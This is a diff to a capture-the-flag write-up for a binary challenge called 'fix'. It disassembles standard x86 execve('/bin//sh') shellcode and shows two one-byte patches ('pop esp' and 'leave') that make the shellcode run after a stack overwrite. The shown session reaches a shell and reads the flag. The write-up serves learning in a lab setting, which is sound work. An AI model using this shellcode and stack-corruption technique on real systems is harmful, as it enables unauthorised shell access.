@@ -1,6 +1,6 @@
 '''
 This is only a write-up of fix.
-'''
+
 *(int*)(buf+32) = buf;      # buf: ebp-0x1C(28h) -> 32 = 28 + 4(retn addr)
 
 before stccpy()
@@ -106,8 +106,8 @@ However when perform the pushing of the shellcode, we will have 5 pushes, so the
 |        |  <- ebp@shellcode+0x8 (esp@main)
 +--------+
 
->>> from pwn import *
->>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
+\>>> from pwn import *
+\>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
    0:   31 c0                   xor    eax, eax
    2:   50                      push   eax
    3:   68 2f 2f 73 68          push   0x68732f2f
@@ -120,15 +120,14 @@ However when perform the pushing of the shellcode, we will have 5 pushes, so the
   15:   cd 80                   int    0x80
 
 
-
 Solution 1:
->>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
+\>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x5c\x53\x89\xe1\xb0\x0b\xcd\x80")
    0:   31 c0                   xor    eax, eax
    2:   50                      push   eax
    3:   68 2f 2f 73 68          push   0x68732f2f
    8:   68 2f 62 69 6e          push   0x6e69622f
    d:   89 e3                   mov    ebx, esp
-   f:   50                      push   eax        // modify to 5c -> pop esp, reset esp to anywhere and will not affect the shellcode.
+   f:   5c                      pop    esp                 // modify to 5c -> pop esp, reset esp to anywhere and will not affect the shellcode.
   10:   53                      push   ebx
   11:   89 e1                   mov    ecx, esp
   13:   b0 0b                   mov    al, 0xb
@@ -144,3 +143,19 @@ Tell me the value to be patched : 92
 get shell
 $ cat flag
 Sorry for blaming shell-strom.org :) it was my ignorance!
+
+Soluton 2：
+\>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xc9\x53\x89\xe1\xb0\x0b\xcd\x80")
+   0:   31 c0                   xor    eax, eax
+   2:   50                      push   eax
+   3:   68 2f 2f 73 68          push   0x68732f2f
+   8:   68 2f 62 69 6e          push   0x6e69622f
+   d:   89 e3                   mov    ebx, esp
+   f:   c9                      leave
+  10:   53                      push   ebx
+  11:   89 e1                   mov    ecx, esp
+  13:   b0 0b                   mov    al, 0xb
+  15:   cd 80                   int    0x80
+
+
+'''
